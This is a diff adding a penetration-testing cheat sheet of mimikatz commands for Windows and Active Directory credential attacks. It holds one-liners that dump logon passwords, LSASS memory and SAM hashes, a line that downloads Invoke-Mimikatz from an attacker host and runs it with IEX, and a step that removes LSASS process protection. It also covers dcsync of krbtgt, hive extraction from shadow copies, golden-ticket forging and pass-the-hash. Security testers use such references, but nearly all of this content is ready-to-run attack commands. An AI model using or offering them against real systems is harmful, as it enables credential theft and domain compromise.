@@ -1,0 +1,42 @@
+% mimikatz, passwords
+
+# Onliner
+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" 
+
+# powershell - load mimikatz
+https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1 powershell
+(new-object system.net.webclient).downloadstring('http://<lhost>/Invoke-Mimikatz.ps1') | IEX
+Invoke mimikatz 
+
+# Disable PPL and dump passwords
+mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit" 
+
+# dcsync - user (krbtgt/Administrator)
+mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<domain> /user:<user>" "exit" 
+
+# Extract credentials from dump
+mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit" 
+
+# extract credentials from shadow copy (1)
+mimikatz.exe "lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" 
+
+# extract credentials from shadow copy (2)
+mimikatz.exe "lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" 
+
+# extract on hand shadow volume copy
+powershell.exe "[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM', '.\Desktop\SYSTEM.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY', '.\Desktop\SECURITY.bkp');[System.IO.File]::Copy('\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM', '.\Desktop\SAM.bkp')" 
+
+% mimikatz, ad
+
+# mimikatz extract tickets
+sekurlsa::tickets /export 
+
+# mimikatz - forest extra SID
+kerberos::golden /user:<user> /domain:<domain> /sid:<child_sid> /krbtgt:<krbtgt_ntlm> /sids:<parent_sid>-519 /ptt 
+
+% mimikatz, pth, passthehash
+# pth to RDP mstsc.exe
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin" 
+
+# pth run powershell remotelly - Followed by : Enter-PSSession -Computer {<}computer_name} 
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:powershell 
